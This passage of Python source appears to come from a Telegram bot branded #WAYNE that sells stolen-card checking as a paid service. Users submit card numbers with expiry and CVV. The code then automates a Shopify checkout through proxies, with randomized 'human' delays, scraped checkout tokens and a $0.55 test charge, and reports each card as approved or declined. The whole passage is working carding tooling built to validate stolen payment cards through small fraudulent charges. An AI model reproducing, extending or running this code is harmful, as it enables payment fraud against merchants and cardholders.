            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Log card validation success
            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")

            # Create HTTP client
            client_params = {
                'timeout': 30.0,
                'follow_redirects': True,
                'http2': True
            }
            
            # Add proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                self.console_logger.sub_step(0, 3, f"Proxy enabled: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Load homepage
                if not await self.load_homepage(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load homepage", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to initialize", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 2: Load product page
                if not await self.load_product_page(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load product", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Product not available", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 3: Add to cart
                if not await self.add_to_cart(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to add to cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Cart error", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 4: Go to checkout
                success, checkout_result = await self.go_to_checkout(client)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, checkout_result, "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)
                checkout_url = checkout_result
                await self.human_delay(1, 2)
                
                # Step 5: Extract tokens
                if not await self.extract_checkout_tokens(client, checkout_url):
                    self.console_logger.sub_step(5, 1, "Token extraction issues, continuing...")
                await self.human_delay(1, 2)
                
                # Step 6: Create payment session
                success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, session_result, "DECLINED", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
                session_id = session_result
                await self.human_delay(1, 2)
                
                # Step 7: Submit payment
                success, payment_result = await self.submit_payment(client, session_id)
                
                elapsed_time = time.time() - start_time
                
                # Log final result
                if success:
                    self.console_logger.result(True, payment_result, "APPROVED", elapsed_time)
                else:
                    self.console_logger.result(False, payment_result, "DECLINED", elapsed_time)
                
                return format_shopify_response(cc, mes, ano, cvv, payment_result, elapsed_time, username, user_data)

        except httpx.TimeoutException:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT_ERROR: Request timeout", elapsed_time, username, user_data)
        except httpx.ConnectError:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR: Connection failed", elapsed_time, username, user_data)
        except Exception as e:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Checking card...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="sh",          # keyword
                gateway_name="Shopify Charge"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
